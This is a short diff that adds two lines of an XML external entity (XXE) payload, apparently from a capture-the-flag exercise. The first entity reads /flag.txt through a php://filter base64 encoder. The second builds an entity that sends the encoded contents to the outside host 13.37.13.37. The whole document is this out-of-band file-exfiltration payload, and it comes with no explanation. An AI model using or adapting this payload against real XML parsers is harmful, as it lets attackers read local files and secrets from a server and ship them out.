@@ -1,0 +1,2 @@
+<!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % make_exfil "<!ENTITY exfil SYSTEM 'http://13.37.13.37/%flag;'>">
